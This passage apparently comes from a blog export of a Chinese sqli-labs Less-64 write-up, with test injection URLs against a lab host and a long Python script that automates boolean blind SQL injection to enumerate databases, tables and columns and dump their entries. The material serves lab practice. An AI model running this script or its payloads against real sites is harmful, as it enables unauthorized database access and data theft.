class=\"string\">\" %d,1),%d,1))\"</span> % (i, j)</span><br><span class=\"line\">            tbname += and_method(url, payload)</span><br><span class=\"line\">            print(<span class=\"string\">'[-]当前猜解'</span>, tbname)</span><br><span class=\"line\">        print(tbname)</span><br><span class=\"line\">        tables.append(tbname)</span><br><span class=\"line\">    print(<span class=\"string\">'Database: %s'</span> % dbname)</span><br><span class=\"line\">    print(<span class=\"string\">'[%d tables]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> table <span class=\"keyword\">in</span> tables:</span><br><span class=\"line\">        print(<span class=\"string\">'[*]'</span>, table)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取列数</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_column_num</span><span class=\"params\">(url, tbname, dbname)</span>:</span></span><br><span class=\"line\">    num = <span class=\"number\">0</span></span><br><span class=\"line\">    payload = head + <span class=\"string\">\" AND ORD(MID((SELECT IFNULL(CAST(COUNT(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='%s' AND TABLE_SCHEMA='%s'),\"</span> % (</span><br><span class=\"line\">        tbname, dbname)</span><br><span class=\"line\">    payload += <span class=\"string\">\"%d,1))&gt;%d--+\"</span></span><br><span class=\"line\">    num = binary_search_db(url, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]列数 [%d]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> num</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取列长度</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_all_columns_len</span><span class=\"params\">(url, num, tbname, dbname)</span>:</span></span><br><span class=\"line\">    thread = []</span><br><span class=\"line\">    key = []</span><br><span class=\"line\">    th = []</span><br><span class=\"line\">    lenth = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        payload = head + <span class=\"string\">\" AND ORD(MID((SELECT IFNULL(CAST(LENGTH(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='%s' AND TABLE_SCHEMA='%s' limit i,1),\"</span> % (</span><br><span class=\"line\">            tbname, dbname)</span><br><span class=\"line\">        payload += <span class=\"string\">\"%d,1))&gt;%d--+\"</span></span><br><span class=\"line\">        payload = re.sub(<span class=\"string\">r'\\bi\\b'</span>, str(i), payload)</span><br><span class=\"line\">        key.append(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run_thread</span><span class=\"params\">(stri, i)</span>:</span></span><br><span class=\"line\">        s = <span class=\"string\">\"co\"</span> + str(i) + <span class=\"string\">\":\"</span> + str(binary_search_db(url, stri))</span><br><span class=\"line\">        <span class=\"comment\"># print(s)</span></span><br><span class=\"line\">        th.append(s)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        t = threading.Thread(target=run_thread,</span><br><span class=\"line\">                             args=(key[i], i,))</span><br><span class=\"line\">        thread.append(t)</span><br><span class=\"line\">        thread[i].start()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        thread[i].join()</span><br><span class=\"line\">    th.sort()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> th:</span><br><span class=\"line\">        i = re.sub(<span class=\"string\">r'co\\d+\\:'</span>, <span class=\"string\">''</span>, i)</span><br><span class=\"line\">        lenth.append(i)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> lenth</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取列名</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_column_name</span><span class=\"params\">(url, tbname, dbname)</span>:</span></span><br><span class=\"line\">    num = get_column_num(url, tbname, dbname)</span><br><span class=\"line\">    lenth = get_all_columns_len(url, num, tbname, dbname)</span><br><span class=\"line\">    columns = []</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(int(len(lenth))):</span><br><span class=\"line\">        coname = <span class=\"string\">\"\"</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, int(lenth[i]) + <span class=\"number\">1</span>):</span><br><span class=\"line\">            payload = head + <span class=\"string\">\" and ascii(substr((select column_name from information_schema.columns where table_name='%s' and table_schema='%s' limit\"</span> % (</span><br><span class=\"line\">                tbname, dbname)</span><br><span class=\"line\">            payload += <span class=\"string\">\" %d,1),%d,1))\"</span> % (i, j)</span><br><span class=\"line\">            coname += and_method(url, payload)</span><br><span class=\"line\">            print(<span class=\"string\">'[-]当前猜解'</span>, coname)</span><br><span class=\"line\">        print(coname)</span><br><span class=\"line\">        columns.append(coname)</span><br><span class=\"line\">    print(<span class=\"string\">'Database: %s'</span> % dbname)</span><br><span class=\"line\">    print(<span class=\"string\">'Table: %s'</span> % tbname)</span><br><span class=\"line\">    print(<span class=\"string\">'[%d columns]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> column <span class=\"keyword\">in</span> columns:</span><br><span class=\"line\">        print(<span class=\"string\">'[*]'</span>, column)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> columns</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取字段数</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_data_num</span><span class=\"params\">(url, tbname, dbname)</span>:</span></span><br><span class=\"line\">    num = <span class=\"number\">0</span></span><br><span class=\"line\">    payload = head + \\</span><br><span class=\"line\">        <span class=\"string\">\" AND ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM %s.%s),\"</span> % (dbname, tbname)</span><br><span class=\"line\">    payload += <span class=\"string\">\" %d,1))&gt;%d--+\"</span></span><br><span class=\"line\">    num = binary_search_db(url, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]字段数 [%d]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> num</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取字段长度</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_data_len</span><span class=\"params\">(url, coname, tbname, dbname, i)</span>:</span></span><br><span class=\"line\">    payload = head + <span class=\"string\">\" AND ORD(MID((SELECT IFNULL(CAST(LENGTH(%s) AS CHAR),0x20) FROM %s.%s limit %d,1),\"</span> % (</span><br><span class=\"line\">        coname, dbname, tbname, i)</span><br><span class=\"line\">    payload += <span class=\"string\">\" %d,1))&gt;%d--+\"</span></span><br><span class=\"line\">    lenth = binary_search_db(url, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]当前字段`%s`长度: %d'</span> % (coname, lenth))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> lenth</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取字段值</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_data</span><span class=\"params\">(url, coname, tbname, dbname, count)</span>:</span></span><br><span class=\"line\">    lenth = get_data_len(url, coname, tbname, dbname, count)</span><br><span class=\"line\">    data = <span class=\"string\">\"\"</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(lenth):</span><br><span class=\"line\">        payload = head + <span class=\"string\">\" and ascii(substr((select %s from %s.%s limit %d,1),%d,1))\"</span> % (</span><br><span class=\"line\">            coname, dbname, tbname, count, i + <span class=\"number\">1</span>)</span><br><span class=\"line\">        data += and_method(url, payload)</span><br><span class=\"line\">        print(<span class=\"string\">'[-]当前猜解'</span>, data)</span><br><span class=\"line\">    print(data)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> data</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">dump</span><span class=\"params\">(url, tbname, dbname, coname=None)</span>:</span></span><br><span class=\"line\">    num = get_data_num(url, tbname, dbname)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> coname <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">        columns = get_column_name(url, tbname, dbname)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        columns = coname.split(<span class=\"string\">\",\"</span>)</span><br><span class=\"line\">    print(columns)</span><br><span class=\"line\">    datas = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> column <span class=\"keyword\">in</span> columns:</span><br><span class=\"line\">            data = get_data(url, column, tbname, dbname, i)</span><br><span class=\"line\">            datas.append(data)</span><br><span class=\"line\">        datas.append(<span class=\"string\">'.'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    res = [s.split() <span class=\"keyword\">for</span> s <span class=\"keyword\">in</span> <span class=\"string\">' '</span>.join(datas).split(<span class=\"string\">'.'</span>) <span class=\"keyword\">if</span> s]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> res:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> i:</span><br><span class=\"line\">            print(<span class=\"string\">'%-15s'</span> % j, end=<span class=\"string\">''</span>)</span><br><span class=\"line\">        print(<span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    parser = OptionParser()</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'-u'</span>, <span class=\"string\">'--url'</span>, type=<span class=\"string\">'string'</span>, dest=<span class=\"string\">'url'</span>,</span><br><span class=\"line\">                      help=<span class=\"string\">'Target URL (e.g. \"http://www.site.com/vuln.php?id=1\")'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'-D'</span>, type=<span class=\"string\">'string'</span>, dest=<span class=\"string\">'db'</span>,</span><br><span class=\"line\">                      help=<span class=\"string\">'DBMS database to enumerate'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'-T'</span>, type=<span class=\"string\">'string'</span>, dest=<span class=\"string\">'tbl'</span>,</span><br><span class=\"line\">                      help=<span class=\"string\">'DBMS database table(s) to enumerate'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'-C'</span>, type=<span class=\"string\">'string'</span>, dest=<span class=\"string\">'col'</span>,</span><br><span class=\"line\">                      help=<span class=\"string\">'DBMS database table column(s) to enumerate, use like id,password'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--current-db'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'cudbs'</span>, help=<span class=\"string\">'Retrieve DBMS current database'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--dbs'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'dbs'</span>, help=<span class=\"string\">'Enumerate ALL database'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--tables'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'tables'</span>, help=<span class=\"string\">'Enumerate DBMS database tables'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--columns'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'columns'</span>, help=<span class=\"string\">'Enumerate DBMS database table columns'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--dump'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'dump'</span>, help=<span class=\"string\">'Dump DBMS database table entries'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--dump-all'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'all'</span>, help=<span class=\"string\">'Dump all DBMS databases tables entries'</span>)</span><br><span class=\"line\">    (options, args) = parser.parse_args()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> options.url <span class=\"keyword\">and</span> options.dbs:</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        getdbname(url)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> options.url <span class=\"keyword\">and</span> options.cudbs:</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        get_cu_db_name(url)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> options.url <span class=\"keyword\">and</span> options.db <span class=\"keyword\">and</span> options.tables:</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        dbname = options.db</span><br><span class=\"line\">        get_table_name(url, dbname)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> (options.url <span class=\"keyword\">and</span> options.db <span class=\"keyword\">and</span> options.tbl <span class=\"keyword\">and</span> options.col <span class=\"keyword\">and</span> options.dump):</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        dbname = options.db</span><br><span class=\"line\">        tbname = options.tbl</span><br><span class=\"line\">        coname = options.col</span><br><span class=\"line\">        dump(url, tbname, dbname, coname)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> (options.url <span class=\"keyword\">and</span> options.db <span class=\"keyword\">and</span> options.tbl <span class=\"keyword\">and</span> options.all):</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        dbname = options.db</span><br><span class=\"line\">        tbname = options.tbl</span><br><span class=\"line\">        dump(url, tbname, dbname)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> (options.url <span class=\"keyword\">and</span> options.db <span class=\"keyword\">and</span> options.tbl <span class=\"keyword\">and</span> options.columns):</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        dbname = options.db</span><br><span class=\"line\">        tbname = options.tbl</span><br><span class=\"line\">        get_column_name(url, tbname, dbname)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        parser.print_help()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-64-GET-盲注-变化3-仅允许130次请求\"><a href=\"#sqli-labs-lession-64-GET-盲注-变化3-仅允许130次请求\" class=\"headerlink\" title=\"sqli-labs lession-64 GET-盲注-变化3-仅允许130次请求\"></a>sqli-labs lession-64 GET-盲注-变化3-仅允许130次请求</h1><hr>\n<h2 id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h2><p><code>&#39;</code>,<code>&quot;</code>,<code>&#39;)</code>,<code>&quot;)</code>,<code>))</code>常用案例依次测试。</p>\n<p><code>http://10.60.17.35:8082/Less-64/?id=1))+and+1=1%23</code></p>\n<p><code>http://10.60.17.35:8082/Less-64/?id=1))+and+1=2%23</code></p>\n<h2 id=\"脚本\"><a href=\"#脚本\" class=\"headerlink\" title=\"脚本\"></a>脚本</h2><p><img src=\"/img/sql/Lesson-64/001.png\" alt=\"001\"></p>\n<p><img src=\"/img/sql/Lesson-64/002.png\" alt=\"002\"></p>\n<p><img src=\"/img/sql/Lesson-64/003.png\" alt=\"003\"></p>\n<p><img src=\"/img/sql/Lesson-64/004.png\" alt=\"004\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br><span class=\"line\">307</span><br><span class=\"line\">308</span><br><span class=\"line\">309</span><br><span class=\"line\">310</span><br><span class=\"line\">311</span><br><span class=\"line\">312</span><br><span class=\"line\">313</span><br><span class=\"line\">314</span><br><span class=\"line\">315</span><br><span class=\"line\">316</span><br><span class=\"line\">317</span><br><span class=\"line\">318</span><br><span class=\"line\">319</span><br><span class=\"line\">320</span><br><span class=\"line\">321</span><br><span class=\"line\">322</span><br><span class=\"line\">323</span><br><span class=\"line\">324</span><br><span class=\"line\">325</span><br><span class=\"line\">326</span><br><span class=\"line\">327</span><br><span class=\"line\">328</span><br><span class=\"line\">329</span><br><span class=\"line\">330</span><br><span class=\"line\">331</span><br><span class=\"line\">332</span><br><span class=\"line\">333</span><br><span class=\"line\">334</span><br><span class=\"line\">335</span><br><span class=\"line\">336</span><br><span class=\"line\">337</span><br><span class=\"line\">338</span><br><span class=\"line\">339</span><br><span class=\"line\">340</span><br><span class=\"line\">341</span><br><span class=\"line\">342</span><br><span class=\"line\">343</span><br><span class=\"line\">344</span><br><span class=\"line\">345</span><br><span class=\"line\">346</span><br><span class=\"line\">347</span><br><span class=\"line\">348</span><br><span class=\"line\">349</span><br><span class=\"line\">350</span><br><span class=\"line\">351</span><br><span class=\"line\">352</span><br><span class=\"line\">353</span><br><span class=\"line\">354</span><br><span class=\"line\">355</span><br><span class=\"line\">356</span><br><span class=\"line\">357</span><br><span class=\"line\">358</span><br><span class=\"line\">359</span><br><span class=\"line\">360</span><br><span class=\"line\">361</span><br><span class=\"line\">362</span><br><span class=\"line\">363</span><br><span class=\"line\">364</span><br><span class=\"line\">365</span><br><span class=\"line\">366</span><br><span class=\"line\">367</span><br><span class=\"line\">368</span><br><span class=\"line\">369</span><br><span class=\"line\">370</span><br><span class=\"line\">371</span><br><span class=\"line\">372</span><br><span class=\"line\">373</span><br><span class=\"line\">374</span><br><span class=\"line\">375</span><br><span class=\"line\">376</span><br><span class=\"line\">377</span><br><span class=\"line\">378</span><br><span class=\"line\">379</span><br><span class=\"line\">380</span><br><span class=\"line\">381</span><br><span class=\"line\">382</span><br><span class=\"line\">383</span><br><span class=\"line\">384</span><br><span class=\"line\">385</span><br><span class=\"line\">386</span><br><span class=\"line\">387</span><br><span class=\"line\">388</span><br><span class=\"line\">389</span><br><span class=\"line\">390</span><br><span class=\"line\">391</span><br><span class=\"line\">392</span><br><span class=\"line\">393</span><br><span class=\"line\">394</span><br><span class=\"line\">395</span><br><span class=\"line\">396</span><br><span class=\"line\">397</span><br><span class=\"line\">398</span><br><span class=\"line\">399</span><br><span class=\"line\">400</span><br><span class=\"line\">401</span><br><span class=\"line\">402</span><br><span class=\"line\">403</span><br><span class=\"line\">404</span><br><span class=\"line\">405</span><br><span class=\"line\">406</span><br><span class=\"line\">407</span><br><span class=\"line\">408</span><br><span class=\"line\">409</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#python3</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">import</span> threading</span><br><span class=\"line\"><span class=\"keyword\">from</span> optparse <span class=\"keyword\">import</span> OptionParser</span><br><span class=\"line\"></span><br><span class=\"line\">feature = <span class=\"string\">'Your Login name'</span></span><br><span class=\"line\">head = <span class=\"string\">\"))\"</span></span><br><span class=\"line\">headers = &#123;</span><br><span class=\"line\">    <span class=\"string\">'user-agent'</span>: <span class=\"string\">'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0'</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getpayload</span><span class=\"params\">(url, payload)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> url + payload</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">binary_search_db</span><span class=\"params\">(url, payload)</span>:</span></span><br><span class=\"line\">    i = <span class=\"number\">1</span></span><br><span class=\"line\">    s = <span class=\"string\">\"\"</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">        count = <span class=\"number\">0</span></span><br><span class=\"line\">        mid = <span class=\"number\">0</span></span><br><span class=\"line\">        low = <span class=\"number\">47</span></span><br><span class=\"line\">        high = <span class=\"number\">57</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> low &lt;= high:</span><br><span class=\"line\">            mid = int((low + high) / <span class=\"number\">2</span>)</span><br><span class=\"line\">            newpayload = payload % (i, mid)</span><br><span class=\"line\">            html = requests.get(getpayload(url, newpayload),</span><br><span class=\"line\">                                headers=headers).text</span><br><span class=\"line\">            <span class=\"keyword\">if</span> feature <span 